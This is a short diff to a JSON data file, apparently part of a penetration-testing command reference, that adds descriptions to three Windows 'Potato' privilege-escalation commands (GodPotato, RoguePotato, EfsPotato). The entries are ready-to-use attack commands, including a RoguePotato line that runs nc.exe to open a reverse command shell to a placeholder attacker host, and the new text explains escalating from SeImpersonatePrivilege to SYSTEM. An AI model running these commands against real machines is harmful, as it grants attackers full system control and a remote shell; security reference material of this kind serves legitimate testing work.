@@ -212,15 +212,18 @@
   "variations": [
     {
       "label": "GodPotato (modern, works 2019/2022)",
-      "command": "GodPotato.exe -cmd \"cmd /c whoami\""
+      "command": "GodPotato.exe -cmd \"cmd /c whoami\"",
+      "description": "GodPotato (modern, works 2019/2022). See the command syntax for exact parameters and flags."
     },
     {
       "label": "RoguePotato",
-      "command": "RoguePotato.exe -r <attacker_ip> -e \"C:\\tools\\nc.exe <lhost> <lport> -e cmd\" -l 9999"
+      "command": "RoguePotato.exe -r <attacker_ip> -e \"C:\\tools\\nc.exe <lhost> <lport> -e cmd\" -l 9999",
+      "description": "Exploits RoguePotato for local privilege escalation from a service account. Uses a fake OXID resolver to trick the system into authenticating and impersonating SYSTEM."
     },
     {
       "label": "EfsPotato",
-      "command": "EfsPotato.exe \"cmd /c whoami\""
+      "command": "EfsPotato.exe \"cmd /c whoami\"",
+      "description": "Exploits EfsPotato for local privilege escalation via the Encrypting File System (EFS) service. Elevates from SeImpersonatePrivilege to SYSTEM."
     }
   ],
   "steps": [
